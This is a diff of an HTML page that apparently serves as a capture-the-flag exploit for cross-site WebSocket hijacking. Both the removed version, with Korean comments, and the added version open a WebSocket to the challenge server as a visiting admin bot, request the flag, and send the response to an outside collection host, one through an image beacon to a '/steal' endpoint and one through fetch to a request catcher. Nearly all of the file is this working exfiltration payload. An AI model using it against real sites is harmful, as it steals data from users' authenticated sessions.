@@ -1,13 +1,22 @@
-<!doctype html>
-<meta charset="utf-8">
-<script>
-/* 1) adminBot이 이 페이지를 열면, 아래 코드가 실행됨            */
-const ws = new WebSocket('wss://wembsoncket.chal.cyberjousting.com');
-ws.onopen = () => ws.send(JSON.stringify({message:'/getFlag'}));
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <script>
 
-/* 2) 서버가 보내주는 플래그를 우리 서버로 exfiltrate              */
-ws.onmessage = ev => {
-  /* ev.data === '{"message":"Flag: CTF{...}","sender":"URL Bot"}' */
-  new Image().src = 'http://server.dottak.me/steal?d=' + encodeURIComponent(btoa(ev.data));
-};
-</script>
+         const ws = new WebSocket('wss://wembsoncket.chal.cyberjousting.com/');
+      ws.onopen = () => {
+        ws.send(JSON.stringify({ message: '/getFlag' }));
+      };
+      ws.onmessage = (event) => {
+        if (event.data.includes('Flag:')) {
+          fetch('https://uwvmoap.request.dreamhack.games/?flag=' + encodeURIComponent(event.data));
+        }
+      };
+    </script>
+</body>
+</html>
